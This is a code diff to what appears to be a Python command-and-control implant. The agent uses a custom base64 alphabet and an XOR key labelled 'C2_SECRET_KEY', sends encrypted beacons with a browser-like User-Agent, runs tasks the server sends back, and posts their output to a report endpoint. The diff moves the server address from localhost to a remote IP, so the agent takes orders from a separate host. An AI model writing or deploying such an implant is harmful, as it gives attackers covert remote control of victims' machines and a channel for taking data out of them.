@@ -10,6 +10,7 @@ CUSTOM_ABC = "zxywvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA0123456789-_"
 STD_ABC    = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
 XOR_KEY    = "C2_SECRET_KEY"
 
+SERVER_IP = "10.37.1.249"
 
 def custom_b64_e(data):
    if isinstance(data, str): data = data.encode()
@@ -73,7 +74,7 @@ def beacon():
    headers = {"X-Agent-Key": custom_b64_e(pub_pem), "User-Agent": "Mozilla/5.0"}
    payload = enc_s(json.dumps({"a": AID, "r": os.urandom(4).hex()}))
    try:
-       r = requests.post("http://localhost:3000/api/health", json={"data": payload}, headers=headers)
+       r = requests.post(f"http://{SERVER_IP}:3000/api/health", json={"data": payload}, headers=headers)
        if r.status_code == 200:
            resp = json.loads(dec_s(r.json().get("data")))
            if resp.get("t"): execute_task(resp["t"])
@@ -104,7 +105,7 @@ def execute_task(t):
    except Exception as e: error_response(500, f"Task execution error: {str(e)}", request_id=rid)
   
    rep = enc_s(json.dumps({"a": AID, "r": rid, "o": custom_b64_e(out[:120])}))
-   requests.post("http://localhost:3000/api/report", json={"data": rep})
+   requests.post(f"http://{SERVER_IP}:3000/api/report", json={"data": rep})
 
 
 if __name__ == "__main__":
